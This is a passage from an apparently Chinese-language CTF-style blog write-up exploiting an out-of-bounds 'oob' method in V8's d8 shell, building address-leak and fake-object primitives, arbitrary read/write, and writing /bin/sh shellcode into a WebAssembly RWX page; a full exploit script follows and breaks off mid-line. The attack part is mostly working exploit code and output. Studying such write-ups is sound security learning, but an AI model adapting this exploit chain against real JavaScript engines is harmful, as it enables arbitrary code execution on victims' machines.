class="line"><span class="keyword">let</span> float_array_map = float_array.oob()</span><br><span class="line"><span class="keyword">let</span> obj_array_map = obj_array.oob()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAddress</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj;<span class="comment">//设置对象数组</span></span><br><span class="line">    obj_array.oob(float_array_map);<span class="comment">//将原本是对象的map覆盖为浮点数数组的map,之后读取就会以浮点数组对象的形式读取</span></span><br><span class="line">    <span class="comment">//从对象数组中读出对象，但是此时整个对象数组已经被改成浮点数组，所以会以浮点数数组形式读取，得到该对象的地址</span></span><br><span class="line">    <span class="comment">//正常情况从对象数组中读取对象会返回一个对象，不是该对象的地址，但是转换成浮点数组就会读取到成员的地址，这就是类型混淆</span></span><br><span class="line">    <span class="keyword">let</span> addr = mem.f2i(obj_array[<span class="number">0</span>])</span><br><span class="line">    obj_array.oob(obj_map);<span class="comment">//重新设置回来</span></span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFakeObj</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = mem.i2f(addr);<span class="comment">//设置浮点数数组</span></span><br><span class="line">    float_array.oob(obj_array_map);<span class="comment">//设置map属性将浮点数数组转化为对象数组</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];<span class="comment">//获取转化之后的对象数组，就能得到该fake_obj，其地址为addr，对象类型为字典对象</span></span><br><span class="line">    float_array.oob(float_map);<span class="comment">//重新设置回来</span></span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>实际测试一下</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj_addr = getAddress(obj);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*]obj_addr:&quot;</span>+hex(obj_addr));</span><br><span class="line">%DebugPrint(obj)</span><br><span class="line">%SystemBreak()</span><br></pre></td></tr></table></div></figure>

<p>可以看到成功获取地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221213865.png" alt="image-20220322121328820"></p>
<p>但是这么判断转化对象成功不太知道…</p>

        <h3 id="2-利用转化函数构造任意读写"   >
          <a href="#2-利用转化函数构造任意读写" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用转化函数构造任意读写" class="headerlink" title="(2)利用转化函数构造任意读写"></a>(2)利用转化函数构造任意读写</h3>
      <p>得到了上述的转化函数，那么我们可以借助这两个转化函数来获取任意地址读和任意地址写</p>

        <h4 id="原理："   >
          <a href="#原理：" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4>
      <p>利用<code>getFakeObj</code>将一个地址转化为一个浮点数组对象，而如果该地址指向的elements指针可控，那么我们就能够修改其elements指针，从而指向任意地方，去进行读写操作。</p>
<p>需要注意的是，由于依据elements读写的时候没有进行检测，所以只要成功修改了elements指针，那么我们我们就能从elements实际存放数据的地方，也就是*(elements+0x10)处读写我们的数据，造成任意地址读写。</p>
<p>假定申请<code>fake_array[6]</code>，如下图布局</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221519946.png" alt="未命名文件 (2)"></p>
<p>即如上图所示，设置<code>fake_array_addr-0x40+0x10</code>的地址为一个<code>fake_obj</code>，那么该<code>fake_obj</code>相关的属性如下</p>
<ul>
<li><p><code>map</code>即为<code>float_array_map</code>，可以由fake_array[0]进行控制，由此可以进行元素读写</p>
</li>
<li><p><code>protototype</code>即设置为0，可由<code>fake_array[1]</code>进行控制</p>
</li>
<li><p><code>elements</code>即设置为我们需要读写的地址，可由<code>fake_array[2]</code>进行控制</p>
</li>
</ul>
<p>那么即可完成整个读写布局。</p>

        <h4 id="代码："   >
          <a href="#代码：" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码：" class="headerlink" title="代码："></a>代码：</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    mem.i2f(<span class="number">0n</span>),</span><br><span class="line">    mem.i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    mem.i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">let</span> fake_array_addr = getAddress(fake_array);</span><br><span class="line"><span class="keyword">let</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">let</span> fake_object = getFakeObj(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = mem.i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = mem.f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: &quot;</span> +hex(addr) + <span class="string">&quot;: &quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = mem.i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = mem.i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : &quot;</span> +hex(addr) + <span class="string">&quot;: &quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="测试效果："   >
          <a href="#测试效果：" class="heading-link"><i class="fas fa-link"></i></a><a href="#测试效果：" class="headerlink" title="测试效果："></a>测试效果：</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(fake_array);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] fake_array_addr:&quot;</span> + hex(fake_array_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] fake_object_addr:&quot;</span> + hex(fake_object_addr));</span><br><span class="line">read64(fake_array_addr-<span class="number">0x40n</span>+<span class="number">0x28n</span>-<span class="number">1n</span>);</span><br><span class="line">write64(fake_object_addr+<span class="number">0x18n</span>-<span class="number">1n</span>,<span class="number">0x01020304n</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></div></figure>

<p>那么我们即读写fake_array[3]处的值，可以看到成功读写</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221529435.png" alt="image-20220322152925354"></p>

        <h2 id="3-实际利用"   >
          <a href="#3-实际利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-实际利用" class="headerlink" title="3.实际利用"></a>3.实际利用</h2>
      
        <h3 id="1-常规堆思路"   >
          <a href="#1-常规堆思路" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-常规堆思路" class="headerlink" title="(1)常规堆思路"></a>(1)常规堆思路</h3>
      <p>通过泄露d8的ELF地址，计算其GOT表地址，任意读泄露出libc地址，然后覆盖<code>free_hook</code>为<code>system</code>函数，之后通过<code>console.log(&#39;/bin/sh\x00&#39;)</code>即可释放一个包含<code>/bin/sh</code>的堆块完成利用</p>
<p>这个泄露地址部分有点不太好搞，随机泄露的部分没看，稳定泄露的部分不太对，获取到的不是d8中的指令地址，而是一个lib库的指令地址。</p>
<p>🔺后面补把</p>

        <h3 id="2-利用WASM机制"   >
          <a href="#2-利用WASM机制" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用WASM机制" class="headerlink" title="(2)利用WASM机制"></a>(2)利用WASM机制</h3>
      <p>如下可以将C语言直接转换为wasm并生成JS配套调用代码</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wasdk.github.io/WasmFiddle/" >WasmFiddle (wasdk.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>wasm就是一个用来调用C代码的机制，可以自己去看看，但是不能赋予危险的代码来调用，只能运行数学计算、图像处理等系统无关的高级语言代码。</p>
<p>简单来说，我们可以创建一片WASM的空间，然后如果我们可以修改到这片运行WASM代码的内存空间(利用上述的任意写)，修改其为shellcode，然后当d8调用WASM的接口时，就可以调用到我们的shellcode了。</p>
<p>而运行WASM代码的内存空间即为WASM_instance+0x88处</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br></pre></td></tr></table></div></figure>

<p>也就是上述的<code>wasmInstance</code>地址+0x88处</p>
<p>其中wasmCode的功能为</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">42</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="①泄露地址"   >
          <a href="#①泄露地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#①泄露地址" class="headerlink" title="①泄露地址"></a>①泄露地址</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_instance_addr = getAddress(wasmInstance);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] wasm_instance_addr: &quot;</span> + hex(wasm_instance_addr));</span><br><span class="line"><span class="keyword">let</span> rwx_page_addr = read64(wasm_instance_addr -<span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] rwx_page_addr: &quot;</span> + hex(rwx_page_addr));</span><br></pre></td></tr></table></div></figure>


        <h4 id="②写入shellcode到wasm的rwx段"   >
          <a href="#②写入shellcode到wasm的rwx段" class="heading-link"><i class="fas fa-link"></i></a><a href="#②写入shellcode到wasm的rwx段" class="headerlink" title="②写入shellcode到wasm的rwx段"></a>②写入shellcode到wasm的rwx段</h4>
      <p>这里有个问题，就是连续使用两次<code>write64</code>会出错，具体原因不清楚，说什么floatArray已经被篡改，再检测合法性会出错，被篡改成啥也不知道啊，这边有点问题，之后看能不能补上。</p>
<p>🔺</p>
<p>那么依据大佬的，需要进行修改，使用<code>dataview</code>来进行修改</p>
<p>原理即为</p>
<p>DataView对象中的<code>backing_store</code>会指向申请的<code>data_buf</code>（<code>backing_store</code>相当于我们的elements），修改<code>backing_store</code>为我们想要写的地址，并通过DataView对象的setBigUint64方法就可以往指定地址正常写入数据了。</p>
<p>🔺</p>
<p>不太懂</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeAny</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">let</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(data.length * <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line">  <span class="keyword">let</span> buf_backing_store_addr = getAddress(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;[*] buf_backing_store_addr: &quot;</span>+hex(buf_backing_store_addr));</span><br><span class="line"></span><br><span class="line">  write64(buf_backing_store_addr-<span class="number">1n</span>,addr);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.length; ++i)</span><br><span class="line">    data_view.setFloat64(i * <span class="number">8</span>, mem.i2f(data[i]), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shellcode = [</span><br><span class="line">  <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">  <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">  <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line">writeAny(rwx_page_addr,shellcode);</span><br></pre></td></tr></table></div></figure>


        <h4 id="③调用wasm来执行shellcode"   >
          <a href="#③调用wasm来执行shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#③调用wasm来执行shellcode" class="headerlink" title="③调用wasm来执行shellcode"></a>③调用wasm来执行shellcode</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f();</span><br></pre></td></tr></table></div></figure>

<p>直接通过这个调用即可。</p>

        <h4 id="EXP"   >
          <a href="#EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memory</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="built_in">this</span>.float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="built_in">this</span>.buf);</span><br><span class="line">        <span class="comment">// this.u32 = new Uint32Array(this.buf);</span></span><br><span class="line">        <span class="comment">// this.bytes = new Uint8Array(this.buf);</span></span><br><span class="line">        <span class="built_in">this</span>.bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(<span class="built_in">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">f2i</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.float64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.bigUint64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">i2f</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.bigUint64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.float64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> mem = <span class="keyword">new</span> Memory()</span><br><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];<span class="comment">//创建一个浮点数数组</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;<span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">let</span> obj_array = [obj];<span class="comment">//创建一个对象数组</span></span><br><span class="line"><span class="keyword">let</span> float_array_map = float_array.oob()</span><br><span class="line"><span class="keyword">let</span> obj_array_map = obj_array.oob()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAddress</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj;<span class="comment">//设置对象数组</span></span><br><span class="line">    obj_array.oob(float_array_map);<span class="comment">//将原本是对象的map覆盖为浮点数数组的map,之后读取就会以浮点数组对象的形式读取</span></span><br><span class="line">    <span class="comment">//从对象数组中读出对象，但是此时整个对象数组已经被改成浮点数组，所以会以浮点数数组形式读取，得到该对象的地址</span></span><br><span class="line">    <span class="comment">//正常情况从对象数组中读取对象会返回一个对象，不是该对象的地址，但是转换成浮点数组就会读取到成员的地址，这就是类型混淆</span></span><br><span class="line">    <span class="keyword">let</span> obj_addr = mem.f2i(obj_array[<span class="number">0</span>])</span><br><span class="line">    obj_array.oob(obj_array_map);<span class="comment">//重新设置回来</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFakeObj</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = mem.i2f(addr);<span class="comment">//设置浮点数数组</span></span><br><span class="line">    float_array.oob(obj_array_map);<span class="comment">//将浮点数数组转化为对象数组</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];<span class="comment">//获取转化之后的对象数组，就能得到该fake_obj，其地址为addr，对象类型为字典对象</span></span><br><span class="line">    float_array.oob(float_array_map);<span class="comment">//重新设置回来</span></span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    mem.i2f(<span class="number">0n</span>),</span><br><span class="line">    mem.i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    mem.i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">let</span> fake_array_addr = getAddress(fake_array);</span><br><span class="line"><span class="keyword">let</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">let</span> fake_object = getFakeObj(fake_object_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] fake_array_addr:&quot;</span> + hex(fake_array_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] fake_object_addr:&quot;</span> + hex(fake_object_addr));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = mem.i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = mem.f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: &quot;</span> +hex(addr) + <span class="string">&quot;: &quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = mem.i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = mem.i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : &quot;</span> +hex(addr) + <span class="string">&quot;: &quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeAny</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">let</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(data.length * <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line">  <span class="keyword">let</span> buf_backing_store_addr = getAddress(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;[*] buf_backing_store_addr: &quot;</span>+hex(buf_backing_store_addr));</span><br><span class="line"></span><br><span class="line">  write64(buf_backing_store_addr-<span class="number">1n</span>,addr);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.length; ++i)</span><br><span class="line">    data_view.setFloat64(i * <span class="number">8</span>, mem.i2f(data[i]), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasmModule = <span 